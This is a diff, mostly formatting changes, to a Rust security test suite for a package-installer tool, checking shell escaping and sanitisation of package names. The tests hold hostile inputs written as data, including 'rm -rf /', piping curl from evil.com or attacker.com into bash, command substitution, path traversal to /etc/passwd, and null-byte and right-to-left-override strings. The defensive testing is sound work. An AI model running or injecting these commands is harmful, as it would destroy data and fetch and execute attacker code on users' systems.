@@ -1,10 +1,10 @@
 //! Security tests for command injection prevention and input validation
-//! 
+//!
 //! This module contains comprehensive tests for security-related functionality,
 //! focusing on realistic threats and proper shell-escape behavior.
 
-use santa::sources::*;
 use santa::data::KnownSources;
+use santa::sources::*;
 
 fn create_test_source() -> PackageSource {
     PackageSource::new_for_test(
@@ -25,7 +25,7 @@ mod command_injection {
     #[test]
     fn test_package_name_with_shell_metacharacters() {
         let source = create_test_source();
-        
+
         let dangerous_packages = vec![
             "git; rm -rf /",
             "git && curl evil.com | bash",
@@ -39,19 +39,18 @@ mod command_injection {
 
         for dangerous_pkg in dangerous_packages {
             let install_cmd = source.install_packages_command(vec![dangerous_pkg.to_string()]);
-            
+
             // The command should be properly escaped - dangerous package names should be quoted
             // to prevent shell interpretation of metacharacters
-            let is_properly_escaped = install_cmd.contains(&format!("'{}'", dangerous_pkg)) || 
-                                     install_cmd.contains(&format!("\"{}\"", dangerous_pkg));
-            
+            let is_properly_escaped = install_cmd.contains(&format!("'{}'", dangerous_pkg))
+                || install_cmd.contains(&format!("\"{}\"", dangerous_pkg));
+
             assert!(
                 is_properly_escaped,
                 "Package name not properly escaped: {} -> {}",
-                dangerous_pkg,
-                install_cmd
+                dangerous_pkg, install_cmd
             );
-            
+
             // Verify the command still contains the base command
             assert!(
                 install_cmd.contains("brew install"),
@@ -83,7 +82,7 @@ mod command_injection {
 
             let adjusted = source_with_prepend.adjust_package_name("git");
             let install_cmd = source_with_prepend.install_packages_command(vec!["git".to_string()]);
-            
+
             // The dangerous prepend should be escaped by shell-escape
             // This means the entire combined string should be quoted
             assert!(
@@ -92,7 +91,7 @@ mod command_injection {
                 dangerous_prepend,
                 adjusted
             );
-            
+
             // The install command should still have the base command
             assert!(
                 install_cmd.contains("brew install"),
@@ -105,7 +104,7 @@ mod command_injection {
     #[test]
     fn test_benign_package_names_preserved() {
         let source = create_test_source();
-        
+
         let benign_packages = vec![
             "git",
             "node.js",
@@ -120,7 +119,7 @@ mod command_injection {
 
         for benign_pkg in benign_packages {
             let adjusted = source.adjust_package_name(benign_pkg);
-            
+
             // Benign package names should either be preserved or lightly escaped
             // They should still be recognizable
             assert!(
@@ -135,24 +134,24 @@ mod command_injection {
     #[test]
     fn test_path_traversal_in_package_names() {
         let source = create_test_source();
-        
+
         let path_traversal_packages = vec![
             "../../../etc/passwd",
-            "../../bin/sh", 
+            "../../bin/sh",
             "../../../usr/bin/curl",
             "..\\..\\windows\\system32\\cmd.exe",
         ];
 
         for traversal_pkg in path_traversal_packages {
             let install_cmd = source.install_packages_command(vec![traversal_pkg.to_string()]);
-            
+
             // Command structure should be preserved
             assert!(
                 install_cmd.contains("brew install"),
                 "Command structure should be preserved: {}",
                 install_cmd
             );
-            
+
             // Path traversal sequences get escaped by our sanitizer
             // They should be safely handled (escaped dots) and quoted by shell-escape
             assert!(
@@ -173,20 +172,17 @@ mod input_validation {
     fn test_null_byte_handling() {
         let source = create_test_source();
 
-        let null_byte_packages = vec![
-            "git\0rm -rf /",
-            "git\x00evil",
-            "package\0\0evil",
-        ];
+        let null_byte_packages = vec!["git\0rm -rf /", "git\x00evil", "package\0\0evil"];
 
         for null_pkg in null_byte_packages {
             let adjusted = source.adjust_package_name(null_pkg);
-            
+
             // Our sanitization removes null bytes completely
             assert!(
                 !adjusted.contains('\0'),
                 "Null byte should be removed: original={:?}, adjusted={}",
-                null_pkg.as_bytes(), adjusted
+                null_pkg.as_bytes(),
+                adjusted
             );
         }
     }
@@ -194,27 +190,31 @@ mod input_validation {
     #[test]
     fn test_unicode_normalization_attacks() {
         let source = create_test_source();
-        
+
         // Unicode characters that could be used for attacks
         let unicode_packages = vec![
-            "git\u{200B}", // Zero-width space
-            "git\u{FEFF}", // Byte order mark
+            "git\u{200B}",     // Zero-width space
+            "git\u{FEFF}",     // Byte order mark
             "git\u{202E}evil", // Right-to-left override
-            "café", // Normal Unicode is fine
-            "package名前", // Non-Latin scripts are fine
+            "café",            // Normal Unicode is fine
+            "package名前",     // Non-Latin scripts are fine
         ];
 
         for unicode_pkg in unicode_packages {
             let adjusted = source.adjust_package_name(unicode_pkg);
-            
+
             // Dangerous Unicode characters should be handled by our sanitizer
-            if unicode_pkg.contains('\u{200B}') || unicode_pkg.contains('\u{FEFF}') || unicode_pkg.contains('\u{202E}') {
+            if unicode_pkg.contains('\u{200B}')
+                || unicode_pkg.contains('\u{FEFF}')
+                || unicode_pkg.contains('\u{202E}')
+            {
                 assert!(
-                    !adjusted.contains('\u{200B}') && 
-                    !adjusted.contains('\u{FEFF}') && 
-                    !adjusted.contains('\u{202E}'),
+                    !adjusted.contains('\u{200B}')
+                        && !adjusted.contains('\u{FEFF}')
+                        && !adjusted.contains('\u{202E}'),
                     "Dangerous Unicode should be sanitized: {} -> {}",
-                    unicode_pkg, adjusted
+                    unicode_pkg,
+                    adjusted
                 );
             } else {
                 // Normal Unicode should be preserved or properly escaped
@@ -235,7 +235,7 @@ mod input_validation {
 
         for empty_pkg in empty_packages {
             let install_cmd = source.install_packages_command(vec![empty_pkg.to_string()]);
-            
+
             // Empty/whitespace package names should be handled gracefully
             assert!(
                 install_cmd.contains("brew install"),
@@ -248,18 +248,18 @@ mod input_validation {
     #[test]
     fn test_extremely_long_package_names() {
         let source = create_test_source();
-        
+
         // Test with very long package name (potential DoS or buffer issues)
         let long_package = "a".repeat(10000);
         let adjusted = source.adjust_package_name(&long_package);
         let install_cmd = source.install_packages_command(vec![long_package]);
-        
+
         // Should not crash and should handle long names appropriately
         assert!(
             adjusted.len() <= 10000 + 100, // Allow for some escaping overhead
             "Package name handling should not cause excessive memory usage"
         );
-        
+
         // Command should still be valid
         assert!(
             install_cmd.contains("brew install"),
@@ -292,7 +292,7 @@ mod platform_security {
 
         for dangerous_pkg in windows_dangerous {
             let adjusted = source.adjust_package_name(dangerous_pkg);
-            
+
             // Windows-specific metacharacters should be escaped with quotes
             assert!(
                 adjusted.starts_with('\'') && adjusted.ends_with('\''),
@@ -315,7 +315,7 @@ mod platform_security {
 
         for dangerous_pkg in unix_dangerous {
             let adjusted = source.adjust_package_name(dangerous_pkg);
-            
+
             // Unix-specific metacharacters should be escaped with quotes
             assert!(
                 adjusted.starts_with('\'') && adjusted.ends_with('\''),
@@ -351,23 +351,29 @@ mod integration_security {
         ];
 
         let install_command = source.install_packages_command(mixed_packages);
-        
+
         // The final command should:
         // 1. Still contain the base install command
         assert!(install_command.contains("brew install"));
-        
+
         // 2. Have dangerous packages properly quoted to prevent execution
         assert!(install_command.contains("'git; rm -rf /'"));
         assert!(install_command.contains("'$(evil_command)'"));
-        
+
         // 3. Still reference the legitimate packages (may or may not be quoted)
-        assert!(install_command.contains("legitimate-package") || install_command.contains("'legitimate-package'"));
-        assert!(install_command.contains("normal_package") || install_command.contains("'normal_package'"));
-        
+        assert!(
+            install_command.contains("legitimate-package")
+                || install_command.contains("'legitimate-package'")
+        );
+        assert!(
+            install_command.contains("normal_package")
+                || install_command.contains("'normal_package'")
+        );
+
         println!("Final secure install command: {}", install_command);
     }
 
-    #[test]  
+    #[test]
     fn test_realistic_attack_scenario() {
         let source = PackageSource::new_for_test(
             KnownSources::Cargo,
@@ -387,11 +393,13 @@ mod integration_security {
         ];
 
         let install_cmd = source.install_packages_command(attack_packages);
-        
+
         // Verify the attack is neutralized by proper escaping
         assert!(install_cmd.contains("cargo install"));
-        assert!(install_cmd.contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'"));
-        
+        assert!(
+            install_cmd.contains("'; curl -s attacker.com/payload.sh | bash; echo fake-package'")
+        );
+
         // The command should be safe to log/display (though not execute with malicious input)
         println!("Secure command with attack neutralized: {}", install_cmd);
     }
@@ -399,7 +407,7 @@ mod integration_security {
     #[test]
     fn test_command_structure_integrity() {
         let source = create_test_source();
-        
+
         // Test that malicious packages don't break the command structure
         let malicious_packages = vec![
             "'; exit; echo '".to_string(),
@@ -409,20 +417,21 @@ mod integration_security {
 
         for pkg in malicious_packages {
             let install_cmd = source.install_packages_command(vec![pkg.clone()]);
-            
+
             // Command should start with the expected base
             assert!(
                 install_cmd.starts_with("brew install"),
                 "Command should start correctly: {}",
                 install_cmd
             );
-            
+
             // Dangerous content should be safely escaped - shell-escape handles quotes properly
             // by escaping them within the quoted string
             assert!(
                 install_cmd.contains("'") || install_cmd.contains("\""),
                 "Malicious package should be quoted/escaped: {} -> {}",
-                pkg, install_cmd
+                pkg,
+                install_cmd
             );
         }
     }
